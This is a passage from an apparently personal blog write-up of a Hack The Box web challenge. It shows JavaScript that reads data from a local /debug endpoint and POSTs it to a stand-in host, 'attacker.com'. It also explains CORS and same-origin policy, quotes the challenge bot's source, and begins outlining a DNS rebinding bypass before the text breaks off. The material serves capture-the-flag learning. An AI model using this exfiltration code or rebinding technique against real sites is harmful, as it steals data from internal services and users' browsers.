&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Error fetching data:&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">error&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Function to send a POST request to `http://attacker.com/` with the fetched data after a delay of 3 seconds
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kd">function&lt;/span> &lt;span class="nx">sendDataWithDelay&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">setTimeout&lt;/span>&lt;span class="p">(()&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;http://attacker.com/&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">method&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;POST&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">headers&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;Content-Type&amp;#39;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;text/plain&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">body&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">data&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">})&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">response&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nx">response&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ok&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nb">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Network response was not ok&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Data sent successfully&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">})&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="k">catch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">error&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;Error sending data:&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">error&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span> &lt;span class="mi">3000&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// Delay of 3 seconds (3000 milliseconds)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Usage: Fetch data and then send it after a delay of 3 seconds
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">fetchData&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">data&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">sendDataWithDelay&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This somewhat worked, but I wasn&amp;rsquo;t able to receive the request to exfil.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/2.png"
width="681"
height="54"
srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/2_hu67d65b1d098bd77e449ca6676a4a7a7c_3249_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/2_hu67d65b1d098bd77e449ca6676a4a7a7c_3249_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="First request received"
class="gallery-image"
data-flex-grow="1261"
data-flex-basis="3026px"
>&lt;/p>
&lt;p>This request could have gotten blocked due to the CORS policy, and upon some research it seemed that &lt;code>http.server&lt;/code> does not allow controlling the &lt;code>CORS&lt;/code> header from the commandline.
However, it is possible with a little scripting and help from &lt;a class="link" href="https://stackoverflow.com/questions/21956683/enable-access-control-on-simple-http-server" target="_blank" rel="noopener"
>stackoverflow&lt;/a>&lt;/p>
&lt;p>Then we can verify it worked with burpsuite.
I blurred out the IP address of my EC2 instance since I don&amp;rsquo;t want it getting touched :).&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/3.png"
width="991"
height="344"
srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/3_hu7a75bd53a89f1200a46c952f53ff0283_41048_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/3_hu7a75bd53a89f1200a46c952f53ff0283_41048_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Initial Request"
class="gallery-image"
data-flex-grow="288"
data-flex-basis="691px"
> &lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/4.png"
width="588"
height="195"
srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/4_huee2fde58cfd10cc3800e0145695d0205_16779_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/4_huee2fde58cfd10cc3800e0145695d0205_16779_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Response with CORS policy"
class="gallery-image"
data-flex-grow="301"
data-flex-basis="723px"
> &lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/5.png"
width="944"
height="367"
srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/5_hu6c68e73ef81735b80425bf175b93cad7_39517_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/5_hu6c68e73ef81735b80425bf175b93cad7_39517_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Request to /debug"
class="gallery-image"
data-flex-grow="257"
data-flex-basis="617px"
> &lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/6.png"
width="550"
height="103"
srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/6_huc1e70bc6e34b0da4849bd25a005f6071_15542_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/6_huc1e70bc6e34b0da4849bd25a005f6071_15542_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Request to /debug received"
class="gallery-image"
data-flex-grow="533"
data-flex-basis="1281px"
>&lt;/p>
&lt;p>However, the POST request never went out.
This was again due to the CORS policy on my local &lt;code>http.server&lt;/code> not havint the correct value, which then made me look into what the CORS and CSP policy was on the actual challenge.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">app&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">use&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">next&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// no XSS or iframing :&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">setHeader&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Content-Security-Policy&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sb">`
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> default-src &amp;#39;self&amp;#39;;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> style-src &amp;#39;self&amp;#39; https://fonts.googleapis.com;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> font-src https://fonts.gstatic.com;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> object-src &amp;#39;none&amp;#39;;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> base-uri &amp;#39;none&amp;#39;;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> frame-ancestors &amp;#39;none&amp;#39;;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="sb"> `&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">trim&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nx">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sr">/\s+/g&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">setHeader&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;X-Frame-Options&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;DENY&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">next&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">});&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I couldn&amp;rsquo;t find anything to indicate what the CORS policy was so I assumed it was set as the default Same Origin Policy.
My testing also implied this, so now is the time to think of how to bypass it.&lt;/p>
&lt;h3 id="cors">CORS
&lt;/h3>&lt;p>CORS is a policy defined by the web server that determines what requests it will accept.
If you intercept a response from a web server with a CORS policy you will see the header:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Access-Control-Allow-Origin: *
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This header can have multiple values to specify multiple domains, or a wildcard as shown above, or a &lt;code>null&lt;/code> value.
It makes sense too because a site that holds private information probably doesn&amp;rsquo;t want to share information to applications outside of its domain.
Anyways, there are 2 parts to CORS.
There is a preflight request that happens from the client to the web server to ensure that the cross-site request is allowed, and then the actual request.
However these only happen when non-standard requests are made I think, or when you need to read the headers or data of the response (TODO: Verify this)&lt;/p>
&lt;h3 id="sop">SOP
&lt;/h3>&lt;p>Same Origin Policy is similar to CORS, but it is enforced by the browser.
This policy just makes it so that a client can only request resources from the same origin, that is the same: &lt;strong>protocal&lt;/strong>, &lt;strong>domain&lt;/strong>, and &lt;strong>port&lt;/strong>.
For example: a request from &lt;a class="link" href="https://foo.com" target="_blank" rel="noopener"
>https://foo.com&lt;/a> to &lt;a class="link" href="http://foo.com" target="_blank" rel="noopener"
>http://foo.com&lt;/a> wouldn&amp;rsquo;t work because there is a different protocol between the two addresses.&lt;/p>
&lt;h3 id="bypass-1">Bypass 1
&lt;/h3>&lt;p>So the problem here is that our site, lets call it &lt;code>http://attacker.com&lt;/code> is trying to make a request to &lt;code>http://localhost/debug&lt;/code>, but because the domain, and the port are different then the request is not allowed by the bot&amp;rsquo;s browser.&lt;/p>
&lt;p>And our goal is for the bot to visit our page, our page sends a request to the local server address of the challenge site, and then our page posts that request to us at another endpoint.&lt;/p>
&lt;p>&lt;img src="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/7.png"
width="681"
height="580"
srcset="https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/7_hub7053d38d366ff35b8479bcbbd2db843_31413_480x0_resize_box_3.png 480w, https://Kvn11.github.io/p/htb-insane-web-oopartdb/img/7_hub7053d38d366ff35b8479bcbbd2db843_31413_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="The problem becomes obvious"
class="gallery-image"
data-flex-grow="117"
data-flex-basis="281px"
>&lt;/p>
&lt;p>Enter DNS Rebind.
While searching for bypasses on hacktricks, I came across this method.
The attack relies on changing the IP address for a domain (rebinding it), very quickly, sort of like a race condition.
How does that help us here?
Well in the source code for the bot, we can see that it doensn&amp;rsquo;t perform all its actions immediately, there are delays.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// challenge/bot.js
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="nx">visit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">async&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">url&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nx">browser&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">browser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">puppeteer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">launch&lt;/span>&lt;span class="p">({&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">headless&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">pipe&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">args&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--no-sandbox&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--disable-setuid-sandbox&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--js-flags=--noexpose_wasm,--jitless&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">],&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">dumpio&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="kc">true&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nx">context&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">browser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">createIncognitoBrowserContext&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nx">page&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">newPage&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="kr">goto&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://localhost/login&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">waitUntil&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;networkidle2&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">evaluate&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">user&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">pass&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">querySelector&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;input[name=user]&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">value&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">querySelector&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;input[name=pass]&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">value&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">pass&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">querySelector&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;button[type=submit]&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">click&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span> &lt;span class="s2">&amp;#34;The Overseer&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">password&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">waitForNavigation&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="kr">goto&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">url&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">waitUntil&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;networkidle2&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">waitForTimeout&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">7000&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">browser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">close&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">browser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">catch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">finally&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">browser&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">browser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">close&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">};&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So the problem is that the client is making a request to &lt;code>http://localhost/debug&lt;/code> from &lt;code>http://attacker.com&lt;/code>, which gets blocked.
But what if during the delay between the bot visiting the attacker site, and then timing out, we rebind the address for &lt;code>http://attacker.com&lt;/code> to instead point to &lt;code>127.0.0.1&lt;/code>?&lt;/p>
&lt;ol>
&lt;li>So the bot visits &lt;code>http://attacker.com&lt;/code>, which will resolve to our real address (lets say it is &lt;code>1.3.3.7&lt;/code>).&lt;/li>
&lt;li>We rebind &lt;code>http://attacker.com&lt;/code> to &lt;code>127.0.0.1&lt;/code>, WHILE the bot still has the page loaded in their browser.&lt;/li>
